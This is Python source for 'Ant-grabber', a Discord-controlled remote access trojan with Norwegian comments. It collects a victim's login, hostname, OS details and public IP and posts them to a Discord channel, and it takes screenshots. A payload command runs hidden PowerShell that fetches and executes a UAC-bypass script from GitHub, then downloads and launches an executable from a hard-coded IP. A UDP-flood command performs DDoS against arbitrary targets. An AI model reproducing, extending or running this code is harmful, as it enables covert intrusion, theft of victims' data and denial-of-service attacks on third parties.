import os
from dotenv import load_dotenv
import discord
from discord.ext import commands
import subprocess
import re
import platform
import socket
import psutil
import time
import pyautogui
import random
import os

import shutil




# skal hente systeminformasjon fra offr
name = os.getlogin()
fqdn = socket.getfqdn()
system_platform = platform.system()
machine = platform.machine()
node = platform.node()
platform_info = platform.platform()
processor = platform.processor()
system_os = platform.system()
release = platform.release()
version = platform.version()
disk = psutil.disk_usage('/') 



body = f"""
New stuff info from victim
===========================
Name: {name}
FQDN: {fqdn}
System Platform: {system_platform}
Machine: {machine}
Node: {node}
Platform: {platform_info}
Processor: {processor}
System OS: {system_os}
Release: {release}
Version: {version}
Disk Usage: {disk.percent}%
"""



TOKEN = ""

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.command()
async def systeminfo(ctx):

    channel = bot.get_channel()  #kanal-ID til discord
    output = subprocess.run(["whoami"], capture_output=True, text=True)
    ip = subprocess.run(["nslookup", "myip.opendns.com", "resolver1.opendns.com"], capture_output=True, text=True)
   


    whoami = output.stdout
    ipadressen = ip.stdout

    
    embed = discord.Embed(
        title="📦 Systeminfo",
        description="Dette er alt av informasjon jeg har fanget for deg min dronning.",
        color=discord.Color.blue()
    )
    embed.add_field(name="COMPUTER/WHOIS", value=f":computer: {whoami} ", inline=False)
    embed.add_field(name="IP ADRESS", value=f":wireless: {ipadressen} ", inline=False)
    embed.add_field(name="PC INFO", value=f":wireless: {body} ", inline=False)



    embed.add_field(name="Versjon", value="v1.0", inline=True)
    embed.set_footer(text="Ant-grabber • 2025")
   
    


    await ctx.send(embed=embed)



#melding når antgrabber har blitt instalert på offret sin pc

@bot.event
async def on_ready():
    
    channel = bot.get_channel()  #kanal-ID
    print(f"✅ Logged in as {bot.user}")

    embed = discord.Embed(
        title=f":rotating_light: PC {name} HAR BLITT INFILTRERT :rotating_light: ",
        description="Hei jeg er en Maur som stjeler informasjon om offret mitt, jeg er en del av Ant-grabber prosjektet. Jeg er her for å hjelpe deg med å samle inn informasjon om offret ditt.",
        color=discord.Color.blue()
    )
    embed.add_field(name=":computer: Kommandoer som du kan bruke", value=f"!ddos: hvordan bruke DDOS \n !udpflood: DDOS angrep \n !payloadinject: instalerer trojan til pc \n !screenshot: tar bilde av skjermen \n !systeminfo: fanger informasjon av pcen", inline=False)


    embed.add_field(name="Versjon", value="v1.0", inline=True)
    embed.set_footer(text="Ant-grabber • 2025")
   




    await channel.send(embed=embed)
 



#prøver å instalere en sliver payload, først vil den prøve seg på en uac bypass også vil den eksludere hele c drive fra defender
#etter dette vil den prøve å instalere sliver payload på pc. jeg tror uac bypass har blitt patcha funker på noen pcr men ikke alle
@bot.command()
async def payload(ctx):
    try:
        subprocess.run([
            "powershell.exe",
            "-WindowStyle", "Hidden",
            "-Command",
            "iex (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/xcode3/bypassing/refs/heads/main/bypass.ps1').Content"
        ], shell=True)

        # Vent i 2 sekunder
        time.sleep(2)

        powershell_command = (
            "(New-Object Net.WebClient).DownloadFile("
            "'http://164.92.112.82/EASY_RANCH.exe',"
            "'$env:TEMP\\EASY_RANCH.exe'); "
            "forfiles /p c:\\windows\\system32 /m notepad.exe /c $env:TEMP\\EASY_RANCH.exe"
        )

        subprocess.run([
            "powershell.exe",
            "-WindowStyle", "Hidden",
            "-Command",
            powershell_command
        ], shell=True)
#rar logikk den sender melding uansett om payload er kastet eller ikke
        await ctx.send("✅✅✅LETS GO Min dronning jeg har kastet trojaner på offret. ✅✅✅\n")
    except Exception as e:
        await ctx.send(f"En feil oppstod: {e}")


@bot.command()
async def screenshot(ctx):
    screenshot = pyautogui.screenshot()
    bilde = screenshot.save("screenshot.png") 
    with open("screenshot.png", "rb") as f:
        file = discord.File(f)
        await ctx.send("✅✅✅ Bilde tatt, min dronning ✅✅✅", file=file)



@bot.command()
async def ddos(ctx):

        await ctx.send("for å sende udp flood så må du taste !flood ipaddre, port, seksunder. EKS(!flood 192.168.1.1 80 10")


#hmm egen botnet for ddos angrep? #veldig simpel eks og kan gjøres bedre
@bot.command()
async def udpflood(ctx, ip: str, port: int, duration: int):
    await ctx.send(f"🚀 Starter UDP flood mot `{ip}:{port}` i `{duration}` sekunder...")

    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)

    count = 0
    while time.time() < timeout:
        sock.sendto(packet, (ip, port))
        count += 1
    print("sender pakker ")
    await ctx.send(f"✅ Ferdig. Sendte {count} pakker.")


bot.run(TOKEN)






